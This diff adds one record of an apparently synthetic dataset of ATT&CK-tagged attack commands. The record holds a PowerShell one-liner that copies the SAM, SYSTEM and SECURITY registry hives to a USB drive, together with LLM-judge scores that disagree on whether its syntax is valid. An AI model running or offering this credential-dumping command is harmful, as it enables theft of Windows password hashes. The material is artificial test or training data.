@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; reg.exe save HKLM\\SAM (Join-Path $usb 's.dat') /y & reg.exe save HKLM\\SYSTEM (Join-Path $usb 'sys.dat') /y & reg.exe save HKLM\\SECURITY (Join-Path $usb 'sec.dat') /y",
+  "explanation": "Saves critical registry hives directly to files on the removable drive, enabling offline exfiltration.",
+  "rationale_steps": [
+    "Determine removable drive path",
+    "Export SAM, SYSTEM, and SECURITY hives",
+    "Write hive files to USB for physical removal"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-7ff327f8",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced delimiters, valid cmdlets/arguments, proper concatenation and Join-Path usage, and acceptable use of ; and the call operator & to invoke subsequent commands.",
+        "semantic_score": 4,
+        "semantic_justification": "It correctly targets a removable drive and saves SAM, SYSTEM, and SECURITY hives for offline exfiltration (aligning with T1052), but in practice requires elevated privileges/SeBackupPrivilege so the stated 'Privilege: None' is unrealistic.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:06:46.974500Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The PowerShell command is mostly well-formed with balanced parentheses and valid syntax, but using `&` as a command separator in PowerShell is unconventional (it's a background operator, not a sequential separator like `;`), which could cause unexpected behavior though it may still parse.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by detecting a removable drive via Get-Volume, then using reg.exe to save the SAM, SYSTEM, and SECURITY hives directly to that USB drive, which is a realistic and well-known credential harvesting and physical exfiltration technique requiring SYSTEM/admin privileges.",
+        "combined_score": 4.5,
+        "confidence": 0.88,
+        "timestamp": "2026-02-18T22:35:13.365764Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 3,
+        "syntactic_justification": "The command uses '&' as a command separator, which is valid in CMD but results in a syntax error in PowerShell (which uses ';').",
+        "semantic_score": 2,
+        "semantic_justification": "The command attempts to export sensitive HKLM hives (SAM, SYSTEM, SECURITY) which require local administrative privileges, contradicting the 'Privilege: None' metadata provided.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:35:17.167463Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
